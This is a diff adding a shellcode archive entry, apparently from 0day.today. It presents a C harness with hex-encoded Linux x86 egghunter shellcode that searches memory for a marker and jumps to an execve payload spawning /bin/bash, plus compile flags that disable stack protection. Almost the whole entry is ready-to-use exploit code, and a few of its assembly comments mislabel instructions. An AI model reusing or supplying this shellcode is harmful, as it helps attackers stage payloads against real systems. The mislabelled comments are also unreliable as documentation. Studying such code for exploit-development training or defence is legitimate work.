@@ -1,0 +1,86 @@
+id: 34323
+date: 04/27/2020
+title: Linux/x86 Egghunter Shellcode (39 bytes)
+author: Bobby Cooke
+cves: 
+
+// Shellcode Title:  Linux/x86 - EggHunter + Null-free (39 Bytes)
+// Shellcode Author: Bobby Cooke
+// Tested on:        Ubuntu 16.04.6 - 4.15.0-45-generic x86 i686
+// Description:      Egghunter for Linux x86 systems. The egghunter dynamically searchs memory for 2 instances of the egg. When the eggs are found, the egghunter passes execution control to the payload at the memory address of the eggs.
+// Shoutout:         skape, vivek, offsec, corelan
+// Usage:
+//   root# gcc -fno-stack-protector -z execstack -o egghunter egghunter.c
+//   root# echo $$ | xargs ps
+//       PID TTY      STAT   TIME COMMAND
+//     13890 pts/0    S      0:00 bash
+//   root# ./egghunter 
+//     Memory Location of Payload: 0x804a040
+//     Size of Egghunter:          39
+//   root# echo $$ | xargs ps
+//       PID TTY      STAT   TIME COMMAND
+//     15658 pts/0    S      0:00 ////bin/bash
+
+// Filename: egghunter.c
+#include <stdio.h>
+#include <string.h>
+// This is the egg for our eggHunter
+// the egg is 4 bytes of executable NOP assembly instructions
+#define egg "\x90\x50\x90\x50"
+
+// Put two eggs in front of our payload
+// This allows our eggHunter to find it in memory
+// The payload is customizable to any x86 Linux shellcode
+// Payload = execve-stack.nasm for SLAE32
+unsigned char payload[] =
+egg
+egg
+"\x31\xc0"  // xor eax, eax
+"\x50"      // push eax
+"\x68\x62\x61\x73\x68" // push 0x68736162 ; "////bin/bash" 
+"\x68\x62\x69\x6e\x2f" // push 0x2f6e6962
+"\x68\x2f\x2f\x2f\x2f" // push 0x2f2f2f2f
+"\x89\xe3"  // mov ebx, esp
+"\x50"      // push eax
+"\x89\xe2"  // mov edx, esp
+"\x53"      // push ebx
+"\x89\xe1"  // mov ecx, esp
+"\xb0\x0b"  // mov al, 11   ; execve syscall
+"\xcd\x80"; // int 0x80     ; execute execve
+
+// Replace the hardcoded egg with a variable.
+// This allows us to easily change the egg for our eggHunter.
+unsigned char egghunter[] =
+"\xbb"egg   // mov ebx, 0x50905090
+"\x31\xc9"  // xor ecx, ecx
+"\xf7\xe1"  // mul ecx      ; Clears eax&edx registers
+// nextPage:
+"\x66\x81\xca\xff\x0f" // or dx, 0xfff; 0xfff=4096=SizeOf(MemoryPage)
+// nextAddress:
+"\x42"      // inc edx      ; Move scanner forward 1 byte
+"\x60"      // pusha        ; Push all registers the stack
+"\x8d\x5a\x04" // lea ebx, [edx+0x4]
+"\xb0\x21"  // mov al, 0x21 ; System Call for accept()
+"\xcd\x80"  // int 0x80     ; Executes accept()
+"\x3c\xf2"  // cmp al, 0xf2 ; Check if access is denied
+"\x61"      // popa         ; restore register state before accept call
+"\x74\xed"  // jnz nextPage ; If memory is not readable, check next memory page
+"\x39\x1a"  // cmp [edx], ebx         ; Egg?
+"\x75\xee"  // jnz nextAddress        ; If no, check next byte 
+"\x39\x5a\x04" //  cmp [edx+0x4], ebx ; Egg+Egg or just Egg?
+"\x75\xe9"  // jnz nextAddress        ; If only 1 Egg, then check next byte
+"\xff\xe2"; // jmp edx                ; Egg+Egg! Egg Found! Jump to Egg!
+
+// This program will run our egghunter.
+// Our eggHunter will search memory until it finds 2 eggs.
+// Once the payload is found it will pass control to the payload.
+
+int main()
+{
+  printf("Memory Location of Payload: %p\n", payload);
+  printf("Size of Egghunter:          %d\n", strlen(egghunter));
+  int (*ret)() = (int(*)())egghunter;
+  ret();
+}
+
+#  0day.today [2023-03-25]  #
